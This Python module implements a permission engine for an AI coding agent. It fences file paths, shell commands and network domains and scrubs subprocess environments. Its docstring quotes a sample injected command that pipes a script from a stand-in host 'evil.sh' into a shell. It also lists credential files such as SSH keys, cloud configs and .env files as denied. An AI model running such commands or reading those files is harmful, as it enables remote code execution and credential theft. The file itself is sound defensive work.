"""Permission engine: path fence, command fence, domain fence, env scrubbing.

Three things here that the original spec left implicit and that are the
difference between a permission *model* and a permission *theatre*:

1. **Canonicalization before containment.** `Path.relative_to` on an
   unresolved path is trivially defeated by `../../` and by a symlink
   inside the workspace pointing at `~/.ssh`. Every path is resolved with
   `os.path.realpath` first.
2. **Metacharacters are a second command.** An allowlist containing `cat`
   is worth nothing if `cat secrets; curl evil.sh | sh` is allowed to
   reach the shell. Metacharacters are refused by default.
3. **Subprocess env is not inherited.** `run_command` gets a scrubbed
   environment, so `env` / `printenv` cannot exfiltrate the very API keys
   the runtime is holding.
"""

from __future__ import annotations

import fnmatch
import os
import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterable

from unified_agent.config import PermissionConfig
from unified_agent.errors import PermissionDenied
from unified_agent.tools.base import Tool
from unified_agent.types import Decision, EffectClass

# ---------------------------------------------------------------------------
# sensitive paths: refused even for READ_ONLY, and even if inside a root
# ---------------------------------------------------------------------------

_SENSITIVE_GLOBS = [
    "**/.ssh/**",
    "**/.aws/**",
    "**/.gnupg/**",
    "**/.kube/**",
    "**/.docker/config.json",
    "**/.config/gh/**",
    "**/.config/gcloud/**",
    "**/.npmrc",
    "**/.pypirc",
    "**/.netrc",
    "**/.git-credentials",
    "**/Library/Keychains/**",
    "**/id_rsa*",
    "**/id_ed25519*",
    "**/id_ecdsa*",
    "**/*.pem",
    "**/*.key",
    "**/*.p12",
    "**/*.keystore",
    "**/.env",
    "**/.env.local",
    "**/.env.production",
    "**/.env.prod",
    "**/.env.development",
    "**/credentials.json",
    "**/service-account*.json",
    "**/secrets.yaml",
    "**/secrets.yml",
]

# ...but these are templates, and reading them is the whole point.
_SENSITIVE_EXCEPTIONS = [
    "**/.env.example",
    "**/.env.sample",
    "**/.env.template",
    "**/.env.dist",
    "**/example.env",
    "**/*.pem.example",
]

_ALWAYS_DENIED_ABS = [
    "/etc/shadow",
    "/etc/sudoers",
    "/private/etc/shadow",
    "/private/etc/sudoers",
]

# Absolute system roots that are never writable regardless of config.
_NEVER_WRITE_ABS = [
    "/etc",
    "/System",
    "/usr",
    "/bin",
    "/sbin",
    "/var",
    "/private/etc",
    "/private/var",
    "/Library",
    "/Applications",
    "/opt",
]

# ...except these. `/var/folders` is the per-user temp directory on macOS and
# is where pytest, editors and half the toolchain put their scratch files;
# blocking it makes the fence a false-positive generator. `/var/tmp` is the
# conventional shared scratch space.
_NEVER_WRITE_EXCEPTIONS = [
    "/var/folders",
    "/private/var/folders",
    "/var/tmp",
    "/private/var/tmp",
]

_METACHARS = re.compile(r"[;&|`$()<>{}!*?\[\]~\n\r\\]")


def _under_any(path: Path, prefixes: list[str]) -> bool:
    text = str(path)
    return any(text == p or text.startswith(p + os.sep) for p in prefixes)


@dataclass(frozen=True)
class Verdict:
    decision: Decision
    reason: str = ""

    @property
    def allowed(self) -> bool:
        return self.decision is Decision.ALLOW

    @property
    def needs_confirmation(self) -> bool:
        return self.decision is Decision.CONFIRM

    @property
    def denied(self) -> bool:
        return self.decision is Decision.DENY


ALLOW = Verdict(Decision.ALLOW)


class PathGuard:
    """Resolves and checks filesystem paths against configured roots."""

    def __init__(self, *, workspace: Path, home: Path, policy: PermissionConfig) -> None:
        self.workspace = Path(os.path.realpath(workspace))
        self.home = Path(os.path.realpath(home))
        self.read_roots = [self._resolve_root(r) for r in policy.fs.read_roots]
        self.write_roots = [self._resolve_root(r) for r in policy.fs.write_roots]
        self.extra_deny = list(policy.fs.extra_deny)

    def _resolve_root(self, raw: str) -> Path:
        p = Path(raw).expanduser()
        if not p.is_absolute():
            p = self.workspace / p
        return Path(os.path.realpath(p))

    # -- resolution -------------------------------------------------------
    def resolve(self, raw: str, *, base: Path | None = None) -> Path:
        """Expand, join, and canonicalize. Never returns a relative path."""
        p = Path(str(raw)).expanduser()
        if not p.is_absolute():
            p = (base or self.workspace) / p
        return Path(os.path.realpath(p))

    # -- checks -----------------------------------------------------------
    def is_sensitive(self, path: Path) -> bool:
        text = str(path)
        if _under_any(path, _ALWAYS_DENIED_ABS):
            return True
        if any(fnmatch.fnmatch(text, e) for e in _SENSITIVE_EXCEPTIONS):
            return False
        if any(fnmatch.fnmatch(text, g) for g in _SENSITIVE_GLOBS):
            return True
        if any(fnmatch.fnmatch(text, g) for g in self.extra_deny):
            return True
        return False

    def _contained(self, path: Path, roots: Iterable[Path]) -> bool:
        for root in roots:
            if path == root or root in path.parents:
                return True
        return False

    def check_read(self, raw: str, *, base: Path | None = None) -> Verdict:
        path = self.resolve(raw, base=base)
        if self.is_sensitive(path):
            return Verdict(Decision.DENY, f"refusing to read sensitive path: {path}")
        if not self._contained(path, self.read_roots):
            roots = ", ".join(str(r) for r in self.read_roots)
            return Verdict(Decision.DENY, f"{path} is outside the readable roots ({roots})")
        return ALLOW

    def check_write(self, raw: str, *, base: Path | None = None) -> Verdict:
        path = self.resolve(raw, base=base)
        if _under_any(path, _NEVER_WRITE_ABS) and not _under_any(
            path, _NEVER_WRITE_EXCEPTIONS
        ):
            return Verdict(Decision.DENY, f"refusing to write into a system location: {path}")
        if self.is_sensitive(path):
            return Verdict(Decision.DENY, f"refusing to write sensitive path: {path}")
        if not self._contained(path, self.write_roots):
            roots = ", ".join(str(r) for r in self.write_roots)
            return Verdict(Decision.DENY, f"{path} is outside the writable roots ({roots})")
        return ALLOW


class CommandGuard:
    """Static analysis of a shell command string. Best-effort, fails closed."""

    def __init__(self, policy: PermissionConfig) -> None:
        self.allow = [a.strip() for a in policy.shell.allow if a.strip()]
        self.deny_patterns = [re.compile(p) for p in policy.shell.deny_patterns]
        self.allow_metacharacters = policy.shell.allow_metacharacters

    def check(self, command: str) -> Verdict:
        text = command.strip()
        if not text:
            return Verdict(Decision.DENY, "empty command")
        for pattern in self.deny_patterns:
            if pattern.search(text):
                return Verdict(
                    Decision.DENY,
                    f"command matches a blocked pattern (/{pattern.pattern}/)",
                )
        if not self.allow_metacharacters:
            found = _METACHARS.search(text)
            if found:
                return Verdict(
                    Decision.DENY,
                    f"shell metacharacter {found.group(0)!r} is not allowed; "
                    "run one command per call, or enable permissions.shell.allow_metacharacters",
                )
        if not self.allow:
            return ALLOW
        try:
            argv = shlex.split(text)
        except ValueError as exc:
            return Verdict(Decision.DENY, f"could not parse command: {exc}")
        if not argv:
            return Verdict(Decision.DENY, "empty command")
        head = os.path.basename(argv[0])
        joined = " ".join([head, *argv[1:3]])
        for entry in self.allow:
            entry_head = entry.split()[0]
            if head == os.path.basename(entry_head) or joined.startswith(entry):
                return ALLOW
        return Verdict(
            Decision.DENY,
            f"{head!r} is not on the command allowlist. Allowed: {', '.join(self.allow)}",
        )


# ---------------------------------------------------------------------------
# env scrubbing
# ---------------------------------------------------------------------------

_SECRET_ENV_HINTS = ("KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "PASSWD", "AUTH")

_SAFE_ENV_KEYS = {
    "PATH",
    "HOME",
    "USER",
    "LOGNAME",
    "SHELL",
    "TERM",
    "LANG",
    "LC_ALL",
    "TMPDIR",
    "PWD",
    "PYTHONPATH",
    "PYTHONUNBUFFERED",
    "VIRTUAL_ENV",
    "NODE_PATH",
    "COLUMNS",
    "LINES",
}


def scrub_env(
    source: dict[str, str] | None = None,
    *,
    known_secrets: Iterable[str] = (),
    extra_allow: Iterable[str] = (),
    overrides: dict[str, str] | None = None,
) -> dict[str, str]:
    """Build a subprocess environment that cannot leak credentials.

    Allowlist, not denylist: `PATH`/`HOME`/`LANG` and a few Python/Node
    vars survive, everything else is dropped. A denylist here would be
    defeated by any vendor whose key variable is named something we did
    not guess (e.g. `DASHSCOPE_KEY_ID`).
    """
    source = source if source is not None else dict(os.environ)
    allow = _SAFE_ENV_KEYS | set(extra_allow)
    secrets = {s for s in known_secrets if s}

    out: dict[str, str] = {}
    for key, value in source.items():
        if key not in allow:
            continue
        if value in secrets:
            continue
        out[key] = value
    out.setdefault("PATH", "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin")
    if overrides:
        for key, value in overrides.items():
            if any(hint in key.upper() for hint in _SECRET_ENV_HINTS):
                continue
            out[key] = value
    return out


# ---------------------------------------------------------------------------
# engine
# ---------------------------------------------------------------------------


class PermissionEngine:
    """Combines the effect-class table with the resource-specific fences.

    Order matters: a hard resource fence (sensitive path, system dir)
    denies outright. Otherwise the effect-class default applies, but any
    resource fence may *raise* the severity (e.g. a write outside the
    workspace is at least CONFIRM even if WRITE_LOCAL is set to allow).
    """

    def __init__(
        self,
        policy: PermissionConfig,
        *,
        workspace: Path,
        home: Path,
        cli_approvals: Iterable[EffectClass] = (),
    ) -> None:
        self.policy = policy
        self.paths = PathGuard(workspace=workspace, home=home, policy=policy)
        self.commands = CommandGuard(policy)
        self.network = policy.network
        # Effects the user pre-approved for this run (`--approve execute_local`).
        self.cli_approvals = frozenset(cli_approvals)

    # -- public -----------------------------------------------------------
    def decide(self, tool: Tool, args: dict[str, Any]) -> Verdict:
        effect = tool.spec.effect_class

        # 1. hard resource fences
        fence = self._resource_fence(tool, args)
        if fence.denied:
            return fence

        # 2. explicit tool-level requirement
        base = self.policy.defaults.get(effect, Decision.CONFIRM)
        if tool.spec.requires_confirmation and base is Decision.ALLOW:
            base = Decision.CONFIRM
        if fence.needs_confirmation and base is Decision.ALLOW:
            base = Decision.CONFIRM

        # 3. deny is absolute
        if base is Decision.DENY:
            if effect in self.cli_approvals:
                return Verdict(
                    Decision.CONFIRM,
                    f"{effect.value} is denied by policy; CLI override downgrades it to "
                    "a per-call confirmation",
                )
            return Verdict(Decision.DENY, f"{effect.value} is denied by policy")

        # 4. CLI pre-approval
        if base is Decision.CONFIRM and effect in self.cli_approvals:
            return Verdict(Decision.ALLOW, f"{effect.value} pre-approved on the command line")

        if base is Decision.CONFIRM:
            return Verdict(Decision.CONFIRM, fence.reason or f"{effect.value} needs confirmation")
        return ALLOW

    def enforce(self, tool: Tool, args: dict[str, Any]) -> None:
        """Raise PermissionDenied instead of returning a verdict."""
        verdict = self.decide(tool, args)
        if verdict.denied:
            raise PermissionDenied(
                verdict.reason, tool=tool.spec.name, effect=tool.spec.effect_class.value
            )

    def check_url(self, url: str) -> Verdict:
        """Public domain check, used by the HTTP tools to re-check redirect hops."""
        return self._check_domain(url)

    # -- resource fences --------------------------------------------------
    def _resource_fence(self, tool: Tool, args: dict[str, Any]) -> Verdict:
        effect = tool.spec.effect_class

        if tool.spec.name in {"write_file", "apply_patch"}:
            target = args.get("path")
            if isinstance(target, str):
                return self.paths.check_write(target)

        if tool.spec.name == "read_file":
            target = args.get("path")
            if isinstance(target, str):
                return self.paths.check_read(target)

        if tool.spec.name in {"list_directory", "search_files", "file_info"}:
            target = args.get("path") or "."
            if isinstance(target, str):
                return self.paths.check_read(target)

        if tool.spec.name in {"run_command", "run_tests", "run_linter"}:
            command = args.get("command")
            if isinstance(command, str):
                verdict = self.commands.check(command)
                if not verdict.allowed:
                    return verdict
            cwd = args.get("cwd")
            if isinstance(cwd, str):
                return self.paths.check_read(cwd)

        if tool.spec.name in {"http_get", "http_post"}:
            url = args.get("url")
            if isinstance(url, str):
                return self._check_domain(url)

        if effect is EffectClass.NETWORK:
            url = args.get("url")
            if isinstance(url, str):
                return self._check_domain(url)

        return ALLOW

    def _check_domain(self, url: str) -> Verdict:
        from urllib.parse import urlparse

        parsed = urlparse(url)
        if parsed.scheme not in {"http", "https"}:
            return Verdict(Decision.DENY, f"only http(s) is allowed, got {parsed.scheme!r}")
        host = parsed.hostname or ""
        if not host:
            return Verdict(Decision.DENY, f"could not parse a hostname from {url!r}")
        if self.network.allow_all:
            return ALLOW
        for pattern in self.network.allow_domains:
            if fnmatch.fnmatch(host, pattern):
                return ALLOW
        return Verdict(
            Decision.DENY,
            f"host {host!r} is not on the network allowlist "
            f"({', '.join(self.network.allow_domains) or 'empty'}). "
            "Add it under [permissions.network].allow_domains",
        )
